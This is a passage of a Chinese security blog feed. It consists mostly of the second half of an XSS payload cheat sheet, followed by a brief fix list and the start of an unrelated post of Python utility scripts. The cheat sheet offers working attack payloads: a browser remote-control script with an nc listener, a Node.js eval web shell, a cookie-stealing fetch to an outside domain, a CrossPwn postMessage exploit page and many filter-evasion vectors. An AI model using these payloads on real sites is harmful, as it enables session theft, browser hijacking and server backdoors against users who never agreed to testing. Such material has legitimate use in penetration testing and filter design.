$_POST[&quot;msg&quot;];</span><br><span class="line">$headers = &quot;From: report@myDomain&quot; . &quot;\r\n&quot;;</span><br><span class="line">if ($origin &amp;&amp; $msg) mail($to, $subject, $msg, $headers);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>81.Browser Remote Control (浏览器远程控制)</strong></p><p>以下payload用于监控浏览器并以交互方式,向其发送javascript命令。注入下面的javascript代码而不是<code>alert(1)</code>，会打开一个类似Unix的终端，使用下面的shell脚本（监听器）。将主机的主机名、IP地址或域名提供给从攻击者机器,然后接收命令去执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">=&gt; Javascript (payload):</span><br><span class="line">setInterval(function()&#123;with(document)body.</span><br><span class="line">appendChild(createElement(&#x27;script&#x27;)).src=&#x27;//HOST:5855&#x27;&#125;,100)</span><br><span class="line"></span><br><span class="line">=&gt; Listener (terminal command):</span><br><span class="line">$ while :; do printf &quot;j$ &quot;; read c; echo $c | nc -lp 5855 &gt;/dev/null; done</span><br></pre></td></tr></table></figure><p><strong>82.Node.js Web Shell (Node.js web后门)</strong></p><p>以下payload用于在易受攻击的Node.js应用程序中创建web后门,在运行下面的有效负载之后，按以下方式使用shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell:http://target:5855/?cmd=my_node.js_command</span><br></pre></td></tr></table></figure><p>弹出计算示例：<code>cmd=require(&#39;child_process&#39;).exec(&#39;gnome-calculator&#39;)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">require(&#x27;http&#x27;).createServer(function(req,res)&#123;res.end(1-</span><br><span class="line">eval(require(&#x27;url&#x27;).parse(req.url,1).query.cmd))&#125;).listen(5855)</span><br></pre></td></tr></table></figure><p><strong>83.Cookie Stealing (窃取cookie信息)</strong></p><p>用于从目标站点设置的受害者用户获取所有cookie。如果无法通过<code>httpOnly</code>安全标志。则在URL中将”+”编码为”%2B”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;//brutelogic.com.br/?c=&#x27;+document.cookie)</span><br></pre></td></tr></table></figure><p><strong>84.XSS Online Test Page (XSS在线测试页面)</strong></p><p>以下地址用于练习XSS向量和有效载荷。检查注入点的源代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/xss.php</span><br></pre></td></tr></table></figure><p><strong>85.HTML Entities Table (HTML实体表)</strong></p><p>用于HTML编码字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://brutelogic.com.br/utils/charref.htm</span><br></pre></td></tr></table></figure><p><strong>85.Multi-Case HTML Injection (多案例HTML注入)</strong></p><p>以下payload可作为一次测试机会，它有更高的成功XSS率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/Script/&quot;&#x27;--&gt;&lt;Body /Autofocus /OnFocus = confirm`1` &lt;!--&gt;</span><br></pre></td></tr></table></figure><p><strong>86.Multi-Case HTML Injection - Base64 (多案例HTML注入-Base64)</strong></p><p>以下payload,在Base64编码以后中作为一次测试机会,可获得更高的XSS成功率。它适用于HTML上下文的所有情况（参见基础部分），包括带有标记注入的JS上下文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PC9TY3JpcHQvIictLT48Qm9keSAvQXV0b2ZvY3VzIC9PbkZvY3VzID0gY29uZmlybWAxYC</span><br><span class="line">A8IS0tPg==</span><br></pre></td></tr></table></figure><p><strong>87.Vectors for Fixed Input Length (固定输入长度的payload)</strong></p><p>以下payload在输入必须具有固定长度时使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MD5    12345678901 &lt;svg/onload=alert(1)&gt;</span><br><span class="line">SHA1   1234567890123456789 &lt;svg/onload=alert(1)&gt;</span><br><span class="line">SHA256 1234567890123456789012345678901234567890123 &lt;svg/onload=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>88.PHP Sanitizing for XSS (PHP xss过滤)</strong></p><p>以下代码只用于阻止每个上下文中的xss，只要输入不返回在非分隔字符串、反勾号中间或任何其他类似于<code>eval</code>的函数（JS上下文中的所有函数）中。但是它不防止基于DOM的XSS，只防止基于源代码的XSS。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$input = preg_replace(&quot;/:|\\\/&quot;, &quot;&quot;, htmlentities($input, ENT_QUOTES))</span><br></pre></td></tr></table></figure><p><strong>89.JavaScript Execution Delay (javascript执行延迟)</strong></p><p>以下payload基于JQuery的外部调用为例,当javascript库或任何其他需要注入的资源,在payload的执行中未完全加载时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onload=function()&#123;$.getScript(&#x27;//brutelogic.com.br/2.js&#x27;)&#125;</span><br><span class="line">onload=x=&gt;$.getScript(&#x27;//brutelogic.com.br/2.js&#x27;)</span><br></pre></td></tr></table></figure><p><strong>90.Image Vectors - Alternative Event Handlers (图像向量-可选事件处理程序)</strong></p><p>以下payload用于触发事件处理程序,不同于<code>onerror</code>事件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">&lt;image</span><br><span class="line">src=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=</span><br><span class="line">srcset=data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=</span><br><span class="line">onload=alert(1)&gt;</span><br><span class="line">onloadend=alert(1)&gt;</span><br><span class="line">onloadstart=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>91.Shortest XSS (最短XSS)</strong></p><p>当有一个有限xss漏洞利用点时。需要一个javascript脚本调用，通过相对路径放在xss需要加载的位置之后。攻击者服务器必须使用攻击脚本对本机脚本（相同路径）或默认404页（更容易）内完成的确切请求进行响应。域名越短越好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=//knoxss.me&gt;</span><br></pre></td></tr></table></figure><p><strong>92.Mobile-only Event Handlers (仅处理移动端应用)</strong></p><p>以下payload,针对移动应用程序时使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ontouchstart=alert(1)&gt;</span><br><span class="line">&lt;html ontouchend=alert(1)&gt;</span><br><span class="line">&lt;html ontouchmove=alert(1)&gt;</span><br><span class="line">&lt;body onorientationchange=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>93.Body Tag (body 标签)</strong></p><p>body标签的集合。最后一个只适用于<code>Internet Explorer</code>浏览器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=alert(1)&gt;</span><br><span class="line">&lt;body onpageshow=alert(1)&gt;</span><br><span class="line">&lt;body onfocus=alert(1)&gt;</span><br><span class="line">&lt;body onhashchange=alert(1)&gt;&lt;meta content=URL;%23 http-equiv=refresh&gt;</span><br><span class="line">&lt;body onscroll=alert(1) style=overflow:auto;height:1000px id=x&gt;#x</span><br><span class="line">&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;x id=x&gt;#x</span><br><span class="line">&lt;body onresize=alert(1)&gt;press F12!</span><br><span class="line">&lt;body onhelp=alert(1)&gt;press F1!</span><br></pre></td></tr></table></figure><p><strong>94.Less Known XSS Vectors (未知的XSS向量)</strong></p><p>未知的XSS向量的集合。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(1)&gt;</span><br><span class="line">&lt;audio src onloadstart=alert(1)&gt;</span><br><span class="line">&lt;video onloadstart=alert(1)&gt;&lt;source&gt;</span><br><span class="line">&lt;video ontimeupdate=alert(1) controls src=//brutelogic.com.br/x.mp4&gt;</span><br><span class="line">&lt;input autofocus onblur=alert(1)&gt;</span><br><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt;</span><br><span class="line">&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;</span><br><span class="line">&lt;select onchange=alert(1)&gt;&lt;option&gt;1&lt;option&gt;2</span><br><span class="line">&lt;menu id=x contextmenu=x onshow=alert(1)&gt;right click me!</span><br><span class="line">&lt;object onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p><strong>95.Alternative PoC - Shake Your Body (非传统的xss payload)</strong></p><p>以下payload用于摇动页面的所有元素，作为漏洞验证的良好可视化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setInterval(x=&gt;&#123;b=document.body.style,b.marginTop=(b.marginTop==&#x27;4px&#x27;)?&#x27;-4px&#x27;:&#x27;4px&#x27;;&#125;,5)</span><br></pre></td></tr></table></figure><p><strong>96.Alternative PoC - Brutality (非传统的xss payload)</strong></p><p>以下payload用于显示”Mortal Kombat’s Sub-Zero”角色的图像以及”brutality”的游戏声音。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d=document,i=d.createElement(&#x27;img&#x27;);i.src=&#x27;//brutelogic.com.br/brutality.jpg&#x27;;</span><br><span class="line">d.body.insertBefore(i,d.body.firstChild);new(Audio)(&#x27;//brutelogic.com.br/brutality.mp3&#x27;).play();</span><br></pre></td></tr></table></figure><p><strong>97.Alternative PoC - Alert Hidden Values (非传统的xss payload)</strong></p><p>以下payload用于证明所有隐藏的HTML值（如目标页面中的标记和<code>nonce</code>）都可以被窃取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">f=document.forms;for(i=0;i&lt;f.length;i++)&#123;e=f[i].elements;for(n in e)&#123;if(e[n].type==&#x27;hidden&#x27;)</span><br><span class="line">&#123;alert(e[n].name+&#x27;: &#x27;+e[n].value)&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>98.Improved Likelihood of Mouse Events (提高鼠标事件的可能性)</strong></p><p>以下payload用于创建要触发鼠标事件的更大区域范围。在任何使用鼠标事件（如<code>onmouseover</code>、<code>onclick</code>等）的XSS payload中添加以下内容（作为属性）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style=position:fixed;top:0;left:0;font-size:999px</span><br></pre></td></tr></table></figure><p><strong>99.Alternative to Style Tag (替代css样式标记)</strong></p><p>以下payload用于当内联和标记名的<code>&quot;style&quot;</code>关键字被阻止时使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=stylesheet href=//HOST/FILE&gt;</span><br><span class="line">&lt;link rel=stylesheet href=data:text/css,CSS&gt;</span><br></pre></td></tr></table></figure><p><strong>100.Cross-Origin Script - CrossPwn (跨源脚本-CrossPwn)</strong></p><p>将下面的内容另存为.html文件，并按如下方式使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://facebook.com.localhost/crosspwn.html?target=//brutelogic.com.br/tests/</span><br><span class="line">status.html&amp;msg=&lt;script&gt;alert(document.domain)</span><br></pre></td></tr></table></figure><p>其中”facebook.com”是允许的来源，”localhost”正在攻击域</p><p><code>&quot;//brutelogic.com.br/tests/status.html&quot;</code>是目标页和<code>&quot;&lt;script&gt;alert(document.domain)&quot;</code>是发送的消息（payload）。</p><p>code:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;body onload=&quot;CrossPwn()&quot;&gt;</span><br><span class="line">&lt;h2&gt;CrossPwn&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;OnMessage XSS&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Use target &amp; msg as URL parameters.&lt;/p&gt;</span><br><span class="line">&lt;iframe id=&quot;f&quot; height=&quot;0&quot; style=&quot;visibility:hidden&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">searchParams = new URLSearchParams(document.location.search);</span><br><span class="line">target = searchParams.get(&#x27;target&#x27;);</span><br><span class="line">msg = searchParams.get(&#x27;msg&#x27;);</span><br><span class="line">document.getElementById(&#x27;f&#x27;).setAttribute(&#x27;src&#x27;, target);</span><br><span class="line">function CrossPwn() &#123;frames[0].postMessage(msg,&#x27;*&#x27;)&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>101.Location Based Payloads (基于位置的有效载荷)</strong></p><p>下面的XSS payload使用一种更详细的方法来执行负载，使用文档属性来提供另一个文档属性，即位置属性。这就产生了复杂的向量，对于绕过滤器和<code>waf</code>非常有用。因为它们使用任意标记（<code>XHTML</code>），所以可以使用前面看到的任何未知的事件处理程序。这里，<code>&quot;onmouseover&quot;</code>将用作默认值。在URL中将加号<code>（＋）</code>编码为<code>%2B</code>。</p><p><strong>102.Location Basics (位置基础知识)</strong></p><p>payload与更简单的操作，以实现重定向到javascript伪协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;j/onmouseover=location=innerHTML&gt;javascript:alert(1)//</span><br><span class="line">&lt;iframe id=t:alert(1) name=javascrip onload=location=name+id&gt;</span><br></pre></td></tr></table></figure><p><strong>103.Location with URL Fragment (包含URL片段的位置)</strong></p><p>如果在POST请求中需要使用带有未编码符号的payload。，URL必须在操作URL中使用片段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;javascript/onmouseover=location=tagName+innerHTML+location.hash&gt;:/*hoverme!</span><br><span class="line">&lt;/javascript&gt;#*/alert(1)</span><br><span class="line">&lt;javascript/onmouseover=location=tagName+innerHTML+location.hash&gt;:&#x27;hoverme!</span><br><span class="line">&lt;/javascript&gt;#&#x27;-alert(1)</span><br><span class="line">&lt;javascript:&#x27;-`/onmouseover=location=tagName+URL&gt;hoverme!#`-alert(1)</span><br><span class="line">&lt;j/onmouseover=location=innerHTML+URL&gt;javascript:&#x27;-`hoverme!&lt;/j&gt;#`-alert(1)</span><br><span class="line">&lt;javas/onmouseover=location=tagName+innerHTML+URL&gt;cript:&#x27;-`hoverme!&lt;/javas&gt;</span><br><span class="line">#`-alert(1)</span><br><span class="line">&lt;javascript:/onmouseover=location=tagName+URL&gt;hoverme!#%0Aalert(1)</span><br><span class="line">&lt;j/onmouseover=location=innerHTML+URL&gt;javascript:&lt;/j&gt;#%0Aalert(1)</span><br><span class="line">&lt;javas/onmouseover=location=tagName+innerHTML+URL&gt;cript:&lt;/javas&gt;#%0Aalert(1)</span><br></pre></td></tr></table></figure><p><strong>104.Location with Leading Alert (最重要的弹窗位置)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">`-alert(1)&lt;javascript:`/</span><br><span class="line">onmouseover=location=tagName+previousSibling.nodeValue&gt;hoverme!</span><br><span class="line">`-alert(1)&lt;javas/</span><br><span class="line">onmouseover=location=tagName+innerHTML+previousSibling.nodeValue&gt;cript:`hoverme!</span><br><span class="line">&lt;alert(1)&lt;!--/onmouseover=location=innerHTML+outerHTML&gt;javascript:1/*hoverme!*/</span><br><span class="line">&lt;/alert(1)&lt;!--&gt;</span><br><span class="line">&lt;j/1=&quot;*/&quot;&quot;-alert(1)&lt;!--/onmouseover=location=innerHTML+outerHTML&gt;</span><br><span class="line">javascript:/*hoverme!</span><br><span class="line">*/&quot;&lt;j/1=/alert(1)//onmouseover=location=innerHTML+</span><br><span class="line">previousSibling.nodeValue+outerHTML&gt;javascript:/*hoverme!</span><br></pre></td></tr></table></figure><p><strong>105.Location with Self URL (last is FF Only) (具有self URL的位置（最后一个仅限FF）)</strong></p><p>以下payload需要用使用输入的易受攻击的参数替换<code>[P&#125;</code>。在URL中将<code>&amp;</code>编码为<code>%26</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg id=?[P]=&lt;svg/onload=alert(1)+ onload=location=id&gt;</span><br><span class="line">&lt;j/onmouseover=location=textContent&gt;?[P]=&lt;svg/onload=alert(1)&gt;hoverme!&lt;/j&gt;</span><br><span class="line">&lt;j/onmouseover=location+=textContent&gt;&amp;[P]=&lt;svg/onload=alert(1)&gt;hoverme!&lt;/j&gt;</span><br><span class="line">&lt;j&amp;[P]=&lt;svg+onload=alert(1)/onmouseover=location+=outerHTML&gt;hoverme!</span><br><span class="line">&lt;/j&amp;[P]=&lt;svg+onload=alert(1)&gt;</span><br><span class="line">&amp;[P]=&lt;svg/onload=alert(1)&gt;&lt;j/</span><br><span class="line">onmouseover=location+=document.body.textContent&gt;hoverme!&lt;/j&gt;</span><br></pre></td></tr></table></figure><p><strong>106.Location with Template Literal (具有模板文本的位置)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;alert(1)&#125;&lt;javascript:`//onmouseover=location=tagName+URL&gt;hoverme!</span><br><span class="line">$&#123;alert(1)&#125;&lt;j/onmouseover=location=innerHTML+URL&gt;javascript:`//hoverme!</span><br><span class="line">$&#123;alert(1)&#125;&lt;javas/onmouseover=location=tagName+innerHTML+URL&gt;cript:`//hoverme!</span><br><span class="line">$&#123;alert(1)&#125;`&lt;javascript:`//</span><br><span class="line">onmouseover=location=tagName+previousSibling.nodeValue&gt;hoverme!</span><br><span class="line">$&#123;alert(1)&#125;`&lt;javas/</span><br><span class="line">onmouseover=location=tagName+innerHTML+previousSibling.nodeValue&gt;cript:`hoverme!</span><br></pre></td></tr></table></figure><p><strong>107.Inner &amp; Outer HTML Properties Alternative (内部和外部HTML属性选项)</strong></p><p>最后这些payload利用元素的innerHTML和outerHTML属性得到与位置向量相同的结果。但是他们需要创建一个完整的HTML向量，而不是一个<code>javascript:aler(1)</code>字符串。下面的元素集合可以与索引0一起使用，它们都可以替换下面使用的head或body元素,以便更容易地遵循：<code>all[0]</code>、<code>anchors[0],</code>、<code>embed[0]</code>、<code>forms[0]</code>、<code>images[0]</code>、<code>links[0]</code>和<code>scripts[0]</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg id=&lt;img/src/onerror&amp;#61alert(1)&gt; onload=head.innerHTML=id&gt;</span><br><span class="line">&lt;svg id=&lt;img/src/onerror&amp;#61alert(1)&gt; onload=body.outerHTML=id&gt;</span><br></pre></td></tr></table></figure><p><strong>108.XSS Vector Schemes (XSS向量格式)</strong></p><p>基本上有3种不同的方案来构建基于HTML的XSS向量。所有字符根据有效语法，用于分隔字段的字节显示在下拉列表中。</p><p><code>%x</code>表示从<code>%00</code>到<code>%0F</code>的每个字节，以及<code>%1X</code>。<code>ENT</code>表示HTML实体,这意味着任何允许的字符或字节都可以在它们的HTML实体表单中使用（字符串和数字）。</p><p>最后，注意<code>javascript</code>这个词可能有一些字节介于两者之间</p><p>字符也可以是URL或HTML编码的。</p><p>Vector Scheme 1 (tag name + handler)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure><p>Vector Scheme 2 (tag name + attribute + handler)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure><p>Vector Scheme 3 (tag name + href|src|data|action|formaction)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass</span><br></pre></td></tr></table></figure><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>可在cookie中设置httponly（浏览器禁止页面的js访问带有httponly属性的cookie）</li><li>xss filter（检查输入，设置白名单方式）</li><li>输出检查（编码，转义，常用编码：html编码，js编码，16进制等)</li><li>针对不同位置的输出，使用不同的处理方式</li><li>处理富文本 富文本XSS问题</li><li>header中使用content-Sencurity-Policy字段，规定请求js的域名白名单（CSP策略）</li></ul><p>不信任任何用户的输入，对每个用户的输入都做严格检查，过滤，在输出的时候，对某些特殊字符进行转义，替换等</p><p><a href="http://blog.nsfocus.net/xss-start-finish/">http://blog.nsfocus.net/xss-start-finish/</a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://imweb.io/topic/597f40b490ccc00402bb181e">https://imweb.io/topic/597f40b490ccc00402bb181e</a></p><p><a href="https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition">https://github.com/heroanswer/XSS_Cheat_Sheet_2020_Edition</a></p><p><a href="https://www.jianshu.com/p/13f0b9a15e46">https://www.jianshu.com/p/13f0b9a15e46</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/107">https://security.tencent.com/index.php/blog/msg/107</a></p><p><a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/">https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/</a></p><p><a href="https://wooyun.js.org/drops/XSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS.html">文件上传xss</a></p><p><a href="http://avfisher.win/archives/tag/xss">存储型XSS扩大战果</a></p><p><a href="https://www.cnblogs.com/-chenxs/p/11441672.html">XSS漏洞的poc与exp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原理&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95&quot;&gt;漏洞测</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Python-scripts</title>
    <link href="https://yinwc.github.io/2020/06/21/Python-scripts/"/>
    <id>https://yinwc.github.io/2020/06/21/Python-scripts/</id>
    <published>2020-06-21T08:14:53.000Z</published>
    <updated>2023-03-06T09:05:12.258Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E5%AF%86%E7%A0%81%E4%B8%AD%E5%8C%85%E5%90%AB%E5%A4%A7%E5%B0%8F%E5%86%99%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E9%95%BF%E5%BA%A6%E5%A4%A7%E4%BA%8E8%E4%BD%8D">密码中包含大小写字母、数字（长度大于8位）</a></li><li><a href="#%E8%AF%BB%E5%8F%96%E7%BD%91%E7%AB%99%E5%90%8D%E7%A7%B0%E5%B9%B6%E5%AD%98%E5%85%A5%E8%A1%A8%E6%A0%BC">读取网站名称并存入表格</a></li><li><a href="#%E5%88%A4%E6%96%AD200%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9F%9F%E5%90%8D">判断200请求的域名</a></li><li><a href="#python-excel%E8%AF%BB%E5%8F%96%E4%BB%A3%E7%A0%81">python-excel读取代码</a></li><li><a href="#%E8%AF%BB%E5%8F%96%E5%89%8Dx%E8%A1%8C">读取前X行</a></li><li><a href="#%E5%88%A0%E9%99%A4%E9%87%8D%E5%A4%8D%E7%9A%84%E8%A1%8C%E6%95%B0%E6%8D%AE">删除重复的行数据</a></li><li><a href="#%E7%AD%9B%E9%80%89%E4%B8%A4%E4%B8%AA%E6%96%87%E4%BB%B6%E4%B8%AD%E4%B8%8D%E5%90%8C%E7%9A%84%E6%95%B0%E6%8D%AE">筛选两个文件中不同的数据</a></li></ul><!-- /TOC --><h2 id="密码中包含大小写字母、数字（长度大于8位）"><a href="#密码中包含大小写字母、数字（长度大于8位）" class="headerlink" title="密码中包含大小写字母、数字（长度大于8位）"></a>密码中包含大小写字母、数字（长度大于8位）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkPwd</span>(<span class="params">pwd</span>):</span><br><span class="line">    compilePwd=re.<span class="built_in">compile</span>(<span class="string">&#x27;^.*(?=.*[0-9])(?=.*[A-Z)(?=.*[a-z)\w&#123;8,&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> compilePwd.<span class="keyword">match</span>(pwd):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><h2 id="读取网站名称并存入表格"><a href="#读取网站名称并存入表格" class="headerlink" title="读取网站名称并存入表格"></a>读取网站名称并存入表格</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            req=requests.get(line)</span><br><span class="line">            res=req.text</span><br><span class="line">            pat=<span class="string">r&quot;&lt;title&gt;(.*?)&lt;/title&gt;&quot;</span></span><br><span class="line">            data=re.findall(pat,res)</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">with</span> <span 